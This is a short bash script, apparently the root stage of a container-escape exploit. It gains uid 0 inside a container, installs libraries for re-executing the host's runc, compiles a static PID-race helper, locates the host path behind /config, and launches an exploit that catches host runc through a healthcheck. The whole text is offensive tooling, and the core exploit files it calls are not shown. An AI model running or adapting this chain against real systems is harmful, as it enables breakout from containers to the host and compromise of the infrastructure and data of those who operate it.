#!/usr/bin/env bash
set -euo pipefail

: "${WORK:?WORK must point to the staged exploit directory}"
: "${PYROOT:?PYROOT must point to the staged apk root}"
PY="${PY:-$PYROOT/usr/bin/python3}"

export PYROOT PY
export LD_LIBRARY_PATH="$PYROOT/usr/lib:$PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export PATH="$PYROOT/usr/bin:$PYROOT/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

echo "[+] root stage uid=$(id -u)"

"$PY" - <<'PY'
import os

try:
    os.setgroups([0])
except OSError:
    pass

try:
    os.setgid(0)
    os.setuid(0)
except OSError:
    pass
PY

echo "[+] installing Ubuntu runtime libraries for host runc re-exec"
"$PY" "$WORK/install_ubuntu_libs.py" "$WORK"

echo "[+] compiling PID race helper"
"$PYROOT/usr/bin/gcc" --sysroot="$PYROOT" -O3 -static -o "$WORK/pid_race" "$WORK/pid_race.c"

echo "[+] locating /config host backing path"
HOSTOUT=$("$PY" "$WORK/find_config_hostout.py")
echo "[+] host output path: $HOSTOUT"

echo "[+] catching host runc via healthcheck"
"$PY" "$WORK/exploit_runc.py" "$WORK" "$HOSTOUT"
